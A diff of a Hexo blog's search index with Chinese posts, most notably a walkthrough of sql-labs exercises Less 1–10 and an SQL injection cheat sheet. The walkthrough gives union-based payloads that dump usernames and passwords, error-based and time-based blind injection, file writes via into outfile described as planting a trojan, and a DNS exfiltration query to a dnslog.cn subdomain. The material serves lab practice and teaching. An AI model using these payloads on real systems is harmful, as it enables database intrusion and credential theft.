@@ -14,9 +14,8 @@
 <li>githubSSH的配置</li>
 <li>sublime的安装使用</li>
 <li>Hexo与github连接</li>
-<li>Hexo的主题切换</li>
-</ul>
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2><ul>
+<li>Hexo的主题切换<a id="more"></a>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2></li>
 <li>安装node.js之前请先安装npm并了解相关知识</li>
 </ul>
 <p>Hexo基于node.js,所以我们需要现在计算机中安装<a href="https://nodejs.org/zh-cn/download/">node.js</a>.<br><img src="https://img-blog.csdnimg.cn/20210111144246737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">选择windows64位安装包下载，下载完后一路next就好啦。</p>
@@ -40,7 +39,7 @@
 <h1 id="githubSSH配置"><a href="#githubSSH配置" class="headerlink" title="githubSSH配置"></a>githubSSH配置</h1><p>搭建完仓库后就开始配置githubSSH。</p>
 <p>进入git bash中，按顺序输入如下代码：</p>
 <blockquote>
-<p>git config –global user.email “<a href="mailto:&#120;&#x78;&#x78;&#64;&#113;&#x71;&#46;&#99;&#x6f;&#x6d;">&#120;&#x78;&#x78;&#64;&#113;&#x71;&#46;&#99;&#x6f;&#x6d;</a>“    //填写注册github的邮箱</p>
+<p>git config –global user.email “<a href="mailto:&#120;&#120;&#x78;&#64;&#113;&#113;&#46;&#x63;&#x6f;&#109;">&#120;&#120;&#x78;&#64;&#113;&#113;&#46;&#x63;&#x6f;&#109;</a>“    //填写注册github的邮箱</p>
 </blockquote>
 <blockquote>
 <p>git config –global user.name “xxxx”    //github 用户名</p>
@@ -85,6 +84,8 @@
     <title>python列表的运用</title>
     <url>/2021/02/01/python%E5%88%97%E8%A1%A8%E7%9A%84%E8%BF%90%E7%94%A8/</url>
     <content><![CDATA[<h2 id="python列表的运用"><a href="#python列表的运用" class="headerlink" title="python列表的运用"></a>python列表的运用</h2><p>列表是python中内置的序列类型，与C语言中的数组有些类似，但实际上python中的列表更像是一种类，其中封装了许多种方法。</p>
+<a id="more"></a>
+
 <h3 id="1、如何定义一个列表list"><a href="#1、如何定义一个列表list" class="headerlink" title="1、如何定义一个列表list"></a>1、如何定义一个列表list</h3><p>这是最简单的列表</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br></pre></td></tr></table></figure>
 <p><img src="https://img-blog.csdnimg.cn/20210201113758182.png"></p>
@@ -187,6 +188,7 @@
     <title>面向对象思想学习</title>
     <url>/2021/01/26/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="面向对象思想学习"><a href="#面向对象思想学习" class="headerlink" title="面向对象思想学习"></a>面向对象思想学习</h1><h2 id="面向对象主要包括七个关键词"><a href="#面向对象主要包括七个关键词" class="headerlink" title="面向对象主要包括七个关键词"></a>面向对象主要包括七个关键词</h2><p>这七个关键词为：数据、方法、对象、类、封装、继承、多态。</p>
+<a id="more"></a>
 <h3 id="1、数据"><a href="#1、数据" class="headerlink" title="1、数据"></a>1、数据</h3><p>根据百度百科得知，数据(data)是信息的<strong>表现形式</strong>和<strong>载体</strong>，是事实或观察的结果，是对客观事物的逻辑归纳，是用于表示客观事物的未经加工的原始素材。<br>例如：学生的档案信息，数字：0，1，2，3等，天气预报上的气温温度，诸如此类都可称为数据。<br>而数据进行加工后，就形成了信息。在计算机中，数据是以二进制信息单元0，1进行表示。</p>
 <h3 id="2、方法"><a href="#2、方法" class="headerlink" title="2、方法"></a>2、方法</h3><p>方法的基本解析是指为获得某种东西或达到某种目的而采取的<strong>途径</strong>，<strong>步骤</strong>和<strong>手段</strong>，而在软件编程语言中，如果将函数定义为类的一部分或者将函数与某个对象绑定，那么该函数就称之为<strong>方法</strong>。<br>方法简单来说，就是你写ACM题的时候自己写的算法，就像为了减少程序运行时间，为了防止TLE，有时候需要自己写一个快速幂函数，这就可以称作方法，为了达成某种目的而去制作能达成这个目的的方式。d=====(￣▽￣*)b</p>
 <h3 id="3、对象"><a href="#3、对象" class="headerlink" title="3、对象"></a>3、对象</h3><p>对象的基本解析是特定人或物，在计算机语言中表现为客观世界中真实存在的人或者物体，在计算机中的逻辑映射。<br>对象可以理解为，在生活中，每个人都是一个对象，每件东西也都是一个对象，可以说<strong>万物皆对象</strong>。在面向对象编程语言中，对象是系统中的基本运行实体，是代码和数据的集合。</p>
@@ -214,7 +216,8 @@
   <entry>
     <title>mysql相关函数</title>
     <url>/2021/02/05/sql/mysql%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<h1 id="mysql相关函数"><a href="#mysql相关函数" class="headerlink" title="mysql相关函数"></a>mysql相关函数</h1><table>
+    <content><![CDATA[<h1 id="mysql相关函数"><a href="#mysql相关函数" class="headerlink" title="mysql相关函数"></a>mysql相关函数</h1><a id="more"></a>
+<table>
 <thead>
 <tr>
 <th>函数名</th>
@@ -321,7 +324,8 @@
   <entry>
     <title>sql注入基本语句</title>
     <url>/2021/02/05/sql/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E8%AF%AD%E5%8F%A5/</url>
-    <content><![CDATA[<h1 id="sql注入基本语句"><a href="#sql注入基本语句" class="headerlink" title="sql注入基本语句"></a>sql注入基本语句</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">order by 4 -- -</span><br><span class="line">判断有多少列</span><br><span class="line">union select 1,2,3 -- -</span><br><span class="line">判断数据显示点</span><br><span class="line">union select 1,user(),database()­­ -- -</span><br><span class="line">显示出登录用户和数据库名</span><br><span class="line">union select 1,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; &#39;security&#39; ),3 -- -</span><br><span class="line">查看数据库有哪些表</span><br><span class="line">union select 1,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; &#39;security&#39; and table_name&#x3D;&#39;users&#39; ),3 -- -</span><br><span class="line">查看对应表有哪些列</span><br><span class="line">union select 1,(select group_concat(concat_ws(0x7e,username,password))from users),3 -- -</span><br><span class="line">查看账号密码信息</span><br></pre></td></tr></table></figure>]]></content>
+    <content><![CDATA[<h1 id="sql注入基本语句"><a href="#sql注入基本语句" class="headerlink" title="sql注入基本语句"></a>sql注入基本语句</h1><a id="more"></a>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">order by 4 -- -</span><br><span class="line">判断有多少列</span><br><span class="line">union select 1,2,3 -- -</span><br><span class="line">判断数据显示点</span><br><span class="line">union select 1,user(),database()­­ -- -</span><br><span class="line">显示出登录用户和数据库名</span><br><span class="line">union select 1,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; &#39;security&#39; ),3 -- -</span><br><span class="line">查看数据库有哪些表</span><br><span class="line">union select 1,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; &#39;security&#39; and table_name&#x3D;&#39;users&#39; ),3 -- -</span><br><span class="line">查看对应表有哪些列</span><br><span class="line">union select 1,(select group_concat(concat_ws(0x7e,username,password))from users),3 -- -</span><br><span class="line">查看账号密码信息</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>sql注入</category>
       </categories>
@@ -331,9 +335,187 @@
       </tags>
   </entry>
   <entry>
+    <title>sql-labs-less-1~10</title>
+    <url>/2021/02/07/sql/sql-labs/sql-labs-Less-1~10/</url>
+    <content><![CDATA[<p>sql-labs-Less-1~10</p>
+<a id="more"></a>
+<p>@<a href="%E7%9B%AE%E5%BD%95">toc</a></p>
+<h1 id="Less-1-基于’-的字符型注入"><a href="#Less-1-基于’-的字符型注入" class="headerlink" title="Less-1-基于’ 的字符型注入"></a>Less-1-基于’ 的字符型注入</h1><p>进去后老套路</p>
+<p>先测试一下注入点</p>
+<blockquote>
+<p>id=1’ and 1=1 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e974130e6213715867b0a5b332150a8c.png"></p>
+<p>把1=1换成1=2</p>
+<blockquote>
+<p>id=1‘  and 1=2 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/8792b518d8154c5ccc0b6e072876661d.png"></p>
+<p>发现没有报错，也没有显示错误信息，说明可以使用 ‘ 字符注入</p>
+<p>查询有多少列</p>
+<blockquote>
+<p>id=1’ order by 4 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/642125828168fb5342d7dc127e2fccd3.png"></p>
+<p>出现错误，证明表中只有三列</p>
+<p>判断显示点</p>
+<blockquote>
+<p>id=-1’ union select 1,2,3 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2f3d76328e8ba05b0004fd749abd53a0.png"></p>
+<p>查询用户，数据库</p>
+<blockquote>
+<p>id=-1’ union select 1,user(),database() –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/846d30e188f1547591acea4bf8b852cf.png"></p>
+<p>查询用户名，密码</p>
+<blockquote>
+<p>id=-1’ union select 1,(select group_concat(concat_ws(‘—‘,username,password)) from users),3 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c8e1124e5d208d21bf60a1522dc9975b.png"></p>
+<h1 id="Less-2-数字型注入"><a href="#Less-2-数字型注入" class="headerlink" title="Less-2-数字型注入"></a>Less-2-数字型注入</h1><p>由提示知道是整数型注入</p>
+<p>老套路</p>
+<blockquote>
+<p>id=1 and 1=1 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2c1f549f4c118fb6be5f6aeb633b17b3.png"></p>
+<p>吧1=1换成1=2</p>
+<blockquote>
+<p>id=1 and 1=2 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/bc45f5df67356a6296e570c0b06e27f2.png"></p>
+<p>没有错误，也没有回显，说明为数字型注入</p>
+<p>查询有多少列</p>
+<blockquote>
+<p>id=1 order by 4 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7a7b987b06c113264fc76ff59bdab201.png"></p>
+<p>查询显示点</p>
+<blockquote>
+<p>id=-1 union select 1,2,3 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/4ebec5db0104a132a7b042c371f940e2.png"></p>
+<p>查询用户名，密码</p>
+<blockquote>
+<p>id=-1 union select 1,(select group_concat(concat_ws(“—“,username,password)) from users),3 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/74bfa2cfcb47bb7ad33d3a418d4baee6.png"></p>
+<h1 id="Less-3-基于’-的字符注入"><a href="#Less-3-基于’-的字符注入" class="headerlink" title="Less-3-基于’) 的字符注入"></a>Less-3-基于’) 的字符注入</h1><p>提示是弯曲的字符，可以猜测可能是 ) 字符注入</p>
+<p>可以直接去看代码验证</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/1bb2bca05087136a3b13a39703a6473e.png"></p>
+<p>知道了注入点，就开始老套路</p>
+<p>查询列数</p>
+<blockquote>
+<p>id=1’) order by 4 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d04a6ee5cdd6fc1d6c785871071abe8b.png"></p>
+<p>查询显示点</p>
+<blockquote>
+<p>id=-1’) union select 1,2,3 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/468064452acf79cc9c0725801c5ff326.png"></p>
+<p>查询用户名，密码</p>
+<blockquote>
+<p>id=-1’) union select 1,(select group_concat(concat_ws(“—“,username,password)) from users),3 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e4e3ad10e7ba5a5a956ddc82f8c0c100.png"></p>
+<h1 id="Less-4-基于”-的字符型注入"><a href="#Less-4-基于”-的字符型注入" class="headerlink" title="Less-4-基于”) 的字符型注入"></a>Less-4-基于”) 的字符型注入</h1><p>根据提示可以知道，这题是双引号字符注入<br>测试注入点，刚开始还以为是只有双引号的注入点</p>
+<blockquote>
+<p>id=1” and 1=1 –+</p>
+</blockquote>
+<p>结果提示错误了<br><img src="https://img-blog.csdnimg.cn/20210206112347169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">于是我就猜测可能是包括了上一题的 ) 字符注入点，在后面加个 )</p>
+<blockquote>
+<p>id=1”) and 1=1 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210206112458418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">有反应了，继续测试</p>
+<blockquote>
+<p>id=1”) and 1=1 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210206112557663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">没有提示错误也没有回显，说明注入点正确，接下来就是老套路了</p>
+<blockquote>
+<p>id=1”) order by 4 –+ //查询列<br>id=-1”) union select 1,2,3 –+ //查询显示点<br>id=-1”) union select 1,(select group_concat(concat_ws(“—“,username,password)) from users),3 –+ //查询用户名，密码</p>
+</blockquote>
+<p>最终结果<br><img src="https://img-blog.csdnimg.cn/20210206112921881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<h1 id="Less-5-基于’-的报错注入"><a href="#Less-5-基于’-的报错注入" class="headerlink" title="Less-5-基于’ 的报错注入"></a>Less-5-基于’ 的报错注入</h1><p>题目刚开始给了个double query的提示，由于是第一次见，没明白是啥意思。<br>就开始常规的测试一下注入点</p>
+<blockquote>
+<p>id=1’ and 1=1 –+<br>id=1’ and 1=2 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210206120620545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20210206120634918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">发现字符注入可行，查询一下列数</p>
+<blockquote>
+<p>id=1’ order by 4 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210206120737992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">然后查显示点的时候，发现一个很严重的问题，题目没有给出显示点</p>
+<blockquote>
+<p>id=-1’ union select 1,2,3 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210206120858544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">还没见过这种类型题，于是去看了眼源码<br><img src="https://img-blog.csdnimg.cn/20210206184538545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>在这看到会输出mysql_error()<br>所以想到了报错注入，因为第一次遇到，所以去找了找报错注入咋搞<br>发现可以updatexml()注入</p>
+<blockquote>
+<p>id=-1’ union select updatexml(1,concat(0x7e,user(),0x7e),1) –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210206185449491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<h2 id="updatexml-语法"><a href="#updatexml-语法" class="headerlink" title="updatexml()语法"></a>updatexml()语法</h2><p>updatexml()：(XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p>
+<p>其实，第一个和第三个参数可以随意填写</p>
+<h1 id="Less-6-基于”-的报错注入"><a href="#Less-6-基于”-的报错注入" class="headerlink" title="Less-6-基于” 的报错注入"></a>Less-6-基于” 的报错注入</h1><p>与上一题同样是报错注入，但是注入点变为了 “ </p>
+<blockquote>
+<p>id=-1” union select updatexml(1,concat(user()),1) –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210207103757424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<h1 id="Less-7-文件读写"><a href="#Less-7-文件读写" class="headerlink" title="Less-7-文件读写"></a>Less-7-文件读写</h1><p>进入题目发现提示是Dump into Outfile，说明要用到文件的读写</p>
+<h2 id="tips："><a href="#tips：" class="headerlink" title="tips："></a>tips：</h2><p>mysql的文件读写函数<strong>load_file</strong>函数与<strong>into outfile</strong>函数只有满足以下条件可以使用:</p>
+<blockquote>
+<p>当前连接的mysql用户为root权限<br>文件权限: chmod a+x pathtofile<br>文件大小: 必须小于max_allowed_packet</p>
+</blockquote>
+<p>文件的读写一般是要通过mysql配置文件的权限才可以使用的，5.5之前的版本是secure_file_priv变量 默认为空 所以直接就可以使用，但是高于5.5时mysql新出了一个secure-file-priv字段<br>所以我们需要更改一下mysql的配置文件，加一行</p>
+<blockquote>
+<p>secure_file_priv= </p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210207160905713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>然后重启一下mysql就可以了。(tips结束<br>进入题目后老方法</p>
+<blockquote>
+<p>id=1’ and 1=1 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210207161123726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">报错了，测试了一会后发现是这样闭合的</p>
+<blockquote>
+<p>id=1’)) and 1=1 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210207161223667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">提示使用outfile()函数<br>于是我们构造一个payload</p>
+<blockquote>
+<p>id=-1’)) union select 1,’这是放木马的’,3 into outfile ‘D:\1.php’ –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210207161431162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">进D盘查看文件在不在<br><img src="https://img-blog.csdnimg.cn/2021020716160698.png"><br>然后写个木马进去查看用户名和密码试试</p>
+<blockquote>
+<p>id=-1’)) union select 1,(select group_concat(concat_ws(“—“,username,password)) from users),3 into outfile ‘D:\2.php’ –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210207161721999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<h1 id="Less-8-基于’-的布尔盲注"><a href="#Less-8-基于’-的布尔盲注" class="headerlink" title="Less-8-基于’ 的布尔盲注"></a>Less-8-基于’ 的布尔盲注</h1><p>这题通过提示我们知道可以使用布尔注入，所以我想到了用dns回显来进行数据查看，这里推荐一个网站<a href="http://dnslog.cn/">http://dnslog.cn/</a><br>进入这个网站之后，点击<strong>Get SubDomain</strong>，可以得到一个dns地址<br><img src="https://img-blog.csdnimg.cn/2021020723174412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">然后编辑注入语句</p>
+<blockquote>
+<p>id=1’ and load_file(concat(“\\“,(database()),”.xk0cq2.dnslog.cn\1.txt”)) –+</p>
+</blockquote>
+<p>注入之后点击Refresh Record即可收到回显结果<br><img src="https://img-blog.csdnimg.cn/20210207232007455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<h1 id="Less-9-基于’-的时间盲注"><a href="#Less-9-基于’-的时间盲注" class="headerlink" title="Less-9-基于’ 的时间盲注"></a>Less-9-基于’ 的时间盲注</h1><p>根据提示我们可以知道，这题是基于时间的注入，所以我们可以使用延时注入<br>先构造payload</p>
+<blockquote>
+<p>id=1’ and if(length(database())&gt;5,sleep(5),1) –+</p>
+</blockquote>
+<p>这样，我们就可以通过浏览器的返回时间来判断数据库名的长度<br><img src="https://img-blog.csdnimg.cn/20210207232912577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210207232832546.png"></p>
+<h1 id="Less-10-基于”-的时间盲注"><a href="#Less-10-基于”-的时间盲注" class="headerlink" title="Less-10-基于” 的时间盲注"></a>Less-10-基于” 的时间盲注</h1><p>这题与上图一样，可以使用延时注入，但是注入闭合点换成了”<br>构造payload</p>
+<blockquote>
+<p>id=1” and if(length(database())&gt;5,sleep(5),1) –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210207233611122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20210207233637454.png"></p>
+]]></content>
+      <categories>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>sql-labs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CTFshow web入门 sql171</title>
     <url>/2021/02/05/sql/ctfshow%20sql/CTF%20show%20web%E5%85%A5%E9%97%A8%20sql171/</url>
-    <content><![CDATA[<h1 id="CTF-show-web入门-sql171"><a href="#CTF-show-web入门-sql171" class="headerlink" title="CTF show web入门 sql171"></a>CTF show web入门 sql171</h1><p>已给出提示：</p>
+    <content><![CDATA[<h1 id="CTF-show-web入门-sql171"><a href="#CTF-show-web入门-sql171" class="headerlink" title="CTF show web入门 sql171"></a>CTF show web入门 sql171</h1><a id="more"></a>
+<p>已给出提示：</p>
 <blockquote>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接sql语句查找指定ID用户</span><br><span class="line">$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
 <p>首先判断注入点</p>
@@ -382,121 +564,6 @@
       <tags>
         <tag>sql注入</tag>
         <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql-labs-Less-1</title>
-    <url>/2021/02/05/sql/sql-labs/Less-1/</url>
-    <content><![CDATA[<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><p>进去后老套路</p>
-<p>先测试一下注入点</p>
-<blockquote>
-<p>id=1’ and 1=1 –+</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/02/05/716bURrIkHvdghZ.png"></p>
-<p>把1=1换成1=2</p>
-<blockquote>
-<p>id=1‘  and 1=2 –+</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/02/05/W94PQrOUdMwizRN.png"></p>
-<p>发现没有报错，也没有显示错误信息，说明可以使用 ‘ 字符注入</p>
-<p>查询有多少列</p>
-<blockquote>
-<p>id=1’ order by 4 –+</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/02/05/nbUFEVivXjhC9ZD.png"></p>
-<p>出现错误，证明表中只有三列</p>
-<p>判断显示点</p>
-<blockquote>
-<p>id=-1’ union select 1,2,3 –+</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/02/05/TJrIBv4LbEM91Hf.png"></p>
-<p>查询用户，数据库</p>
-<blockquote>
-<p>id=-1’ union select 1,user(),database() –+</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/02/05/gke8dh1tWM3fyKb.png"></p>
-<p>查询用户名，密码</p>
-<blockquote>
-<p>id=-1’ union select 1,(select group_concat(concat_ws(‘—‘,username,password)) from users),3 –+</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/02/05/LjZUphumTacglvb.png"></p>
-]]></content>
-      <categories>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
-        <tag>sql-labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql-labs-Less-3</title>
-    <url>/2021/02/05/sql/sql-labs/Less-3/</url>
-    <content><![CDATA[<h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><p>提示是弯曲的字符，可以猜测可能是 ) 字符注入</p>
-<p>可以直接去看代码验证</p>
-<p><img src="https://i.loli.net/2021/02/05/jG6crsE7zpedyBm.png"></p>
-<p>知道了注入点，就开始老套路</p>
-<p>查询列数</p>
-<blockquote>
-<p>id=1’) order by 4 –+</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/02/05/zj5PJTWx1VmGRAM.png"></p>
-<p>查询显示点</p>
-<blockquote>
-<p>id=-1’) union select 1,2,3 –+</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/02/05/hb2Cf5GMTVcQkun.png"></p>
-<p>查询用户名，密码</p>
-<blockquote>
-<p>id=-1’) union select 1,(select group_concat(concat_ws(“—“,username,password)) from users),3 –+</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/02/05/SzRcalgCXLOkmyw.png"></p>
-]]></content>
-      <categories>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
-        <tag>sql-labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql-labs-Less-2</title>
-    <url>/2021/02/05/sql/sql-labs/Less-2/</url>
-    <content><![CDATA[<h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><p>由提示知道是整数型注入</p>
-<p>老套路</p>
-<blockquote>
-<p>id=1 and 1=1 –+</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/02/05/WQwvVTFnXJ5uZLk.png"></p>
-<p>吧1=1换成1=2</p>
-<blockquote>
-<p>id=1 and 1=2 –+</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/02/05/KArDL278xCdeFfz.png"></p>
-<p>没有错误，也没有回显，说明为数字型注入</p>
-<p>查询有多少列</p>
-<blockquote>
-<p>id=1 order by 4 –+</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/02/05/XVn3rlqwRDE72mc.png"></p>
-<p>查询显示点</p>
-<blockquote>
-<p>id=-1 union select 1,2,3 –+</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/02/05/eLAR9GtmOQDx4Kg.png"></p>
-<p>查询用户名，密码</p>
-<blockquote>
-<p>id=-1 union select 1,(select group_concat(concat_ws(“—“,username,password)) from users),3 –+</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/02/05/Ct1aSrnvK3cE8Yz.png"></p>
-]]></content>
-      <categories>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
-        <tag>sql-labs</tag>
       </tags>
   </entry>
 </search>
